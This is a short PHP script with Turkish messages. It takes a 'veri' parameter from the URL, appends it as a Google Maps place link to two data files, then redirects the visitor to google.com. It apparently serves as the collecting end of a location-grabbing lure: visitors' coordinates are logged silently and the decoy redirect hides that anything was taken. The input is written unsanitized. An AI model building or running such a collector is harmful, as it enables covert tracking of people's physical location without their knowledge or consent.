<?php 

if (isset($_GET["veri"])) {

	$ac1 = fopen("../data/map.txt", "a+");
	$veri = ("https://www.google.com/maps/place/".$_GET["veri"]);
	fwrite($ac1, $veri);
	fclose($ac1);
	$ac = fopen("../data/old.txt", "a+");
	$veri = ("https://www.google.com/maps/place/".$_GET["veri"]."\n");
	fwrite($ac, $veri);
	fclose($ac);

?>
<?php	
header("Location: https://www.google.com/");
}
else{
	echo "Lütfen bir veri giriniz.";
}



 ?>